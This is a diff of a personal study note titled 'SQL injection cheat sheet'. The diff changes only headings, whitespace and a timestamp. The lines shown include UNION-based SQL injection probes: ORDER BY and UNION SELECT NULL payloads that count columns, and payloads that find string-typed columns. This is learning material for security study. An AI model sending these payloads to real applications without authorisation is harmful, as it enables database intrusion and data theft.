@@ -2,7 +2,7 @@
 id: ecm8gbfd442dpxbe5fggfzo
 title: SQL_Injection
 desc: ''
-updated: 1677387299652
+updated: 1677388698823
 created: 1677380025812
 ---
 ## SQL injection cheat sheet
@@ -134,19 +134,19 @@ For a UNION query to work, two key requirements must be met:
 - The individual queries must return the same number of columns.<br>
 - The data types in each column must be compatible between the individual queries.
     
-    #### Number of columns:
+    **Number of columns:**
     ```sql
     ' ORDER BY 1--
     ' ORDER BY 2--
     ... until error
-
+    
     OR
 
     ' UNION SELECT NULL--
     ' UNION SELECT NULL,NULL--
     ... until success
     ```
-    #### Probing for string data in columns:
+    **Probing for string data in columns:**
     ```sql
     ' UNION SELECT 'a',NULL,NULL,NULL--
     ' UNION SELECT NULL,'a',NULL,NULL--
